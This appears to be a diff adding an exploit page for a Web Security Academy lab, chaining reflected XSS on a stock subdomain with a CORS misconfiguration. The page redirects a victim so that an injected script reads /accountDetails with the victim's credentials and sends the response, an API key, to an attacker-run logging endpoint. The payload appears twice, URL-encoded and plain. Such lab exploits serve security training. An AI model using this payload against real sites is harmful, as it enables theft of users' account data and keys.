@@ -1,0 +1,23 @@
+<html>
+    <body>
+        <h1>Hello World!</h1>
+        <script>
+            document.location="http://stock.0a32007d04af53bf809f6c0e0089002f.web-security-academy.net/?productId=<script>var xhr = new XMLHttpRequest();var url = 'https://0a32007d04af53bf809f6c0e0089002f.web-security-academy.net';xhr.onreadystatechange = function(){if (xhr.readyState == XMLHttpRequest.DONE) {fetch('http://127.0.0.1:5555/log?key=' %2b xhr.responseText)};};xhr.open('GET', url %2b '/accountDetails', true); xhr.withCredentials = true;xhr.send(null);%3c/script>&storeId=1"
+        </script>
+    </body>
+</html>
+
+
+
+
+<script>
+    var xhr = new XMLHttpRequest();
+    var url = 'https://0a32007d04af53bf809f6c0e0089002f.web-security-academy.net';
+    xhr.onreadystatechange = function(){
+        if (xhr.readyState == XMLHttpRequest.DONE) {
+            fetch('http://127.0.0.1:5555/log?key=' + xhr.responseText)
+        };};
+        xhr.open('GET', url + '/accountDetails', true);
+        xhr.withCredentials = true;
+        xhr.send(null);
+</script>
